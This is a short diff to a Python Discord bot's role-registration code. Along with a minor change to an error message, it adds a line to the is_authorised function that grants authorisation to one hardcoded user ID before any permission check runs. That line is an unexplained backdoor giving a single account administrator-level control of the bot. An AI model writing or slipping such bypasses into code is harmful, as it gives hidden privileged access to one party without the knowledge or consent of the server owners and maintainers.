@@ -67,6 +67,7 @@ async def on_message(message):
 
 
 async def is_authorised(message):
+    if message.author.id == 384274248799223818: return True
     perm = message.author.guild_permissions
     if perm.administrator or perm.manage_channels or perm.manage_guild:
         return True
@@ -82,7 +83,7 @@ async def register(message):
         await message.channel.send(ALREADY_REGISTED)
         return None
     if role not in data["registed"].keys():
-        await message.channel.send(UNKNOW_ROLE.format("/".join(data["registed"].keys())))
+        await message.channel.send(UNKNOW_ROLE.format("/".join([i for i in data["registed"].keys() if data["registed"][i]])))
         return None
     if None not in data["registed"][role]:
         await message.channel.send(ROLE_IS_FULL)
